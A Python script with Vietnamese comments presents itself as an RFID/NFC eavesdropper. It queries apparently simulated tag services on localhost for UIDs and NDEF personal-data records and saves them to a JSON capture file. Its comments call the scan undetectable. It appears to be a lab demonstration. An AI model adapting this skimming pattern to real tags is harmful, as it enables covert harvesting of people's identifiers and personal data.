#!/usr/bin/env python3
"""RFID/NFC Passive Eavesdropper — thu thập UID từ xa"""
import socket, json, time
from datetime import datetime
from colorama import Fore, init
init(autoreset=True)

CAPTURE_FILE = 'uid_capture.json'
captured_uids = []

def sniff_rfid():
    """Kết nối tới tag như một reader bình thường — không bị phát hiện"""
    s = socket.socket()
    s.settimeout(2)
    s.connect(('127.0.0.1', 6001))
    # Gửi QUERY — thẻ phát UID mà không hỏi về danh tính requester
    s.send(json.dumps({'cmd':'QUERY'}).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp

def sniff_nfc():
    """Đọc toàn bộ NDEF content từ tag NFC"""
    s = socket.socket()
    s.settimeout(2)
    s.connect(('127.0.0.1', 6011))
    # Bước 1: Lấy UID
    s.send(json.dumps({'cmd':'GET_UID'}).encode())
    uid_resp = json.loads(s.recv(512).decode())
    # Bước 2: Đọc NDEF (thông tin cá nhân)
    s.send(json.dumps({'cmd':'READ_NDEF'}).encode())
    ndef_resp = json.loads(s.recv(2048).decode())
    s.close()
    return uid_resp, ndef_resp

print(f'{Fore.RED}[EAVESDROP] Starting passive scan...')
print(f'{Fore.RED}[EAVESDROP] Target: RFID :6001 + NFC :6011\n')

for i in range(5):
    ts = datetime.now().strftime('%H:%M:%S.%f')[:12]
    # Nghe lén RFID
    try:
        rfid = sniff_rfid()
        uid  = rfid.get('uid','N/A')
        print(f'{Fore.RED}[{ts}] RFID CAPTURED: UID={uid} type={rfid.get("type")}')
        captured_uids.append({'ts':ts,'proto':'RFID','uid':uid})
    except: pass
    # Nghe lén NFC
    try:
        uid_r, ndef_r = sniff_nfc()
        nfc_uid = uid_r.get('uid','N/A')
        records = ndef_r.get('records',[])
        print(f'{Fore.RED}[{ts}] NFC CAPTURED: UID={nfc_uid}')
        for rec in records:
            print(f'  -> {rec["type"]}: {rec.get("value",rec.get("data",""))[:60]}')
        captured_uids.append({'ts':ts,'proto':'NFC','uid':nfc_uid,'ndef':records})
    except: pass
    time.sleep(1)

import json as _json
with open(CAPTURE_FILE,'w') as f: _json.dump(captured_uids, f, indent=2)
print(f'\n{Fore.RED}[EAVESDROP] Saved {len(captured_uids)} captures to {CAPTURE_FILE}')
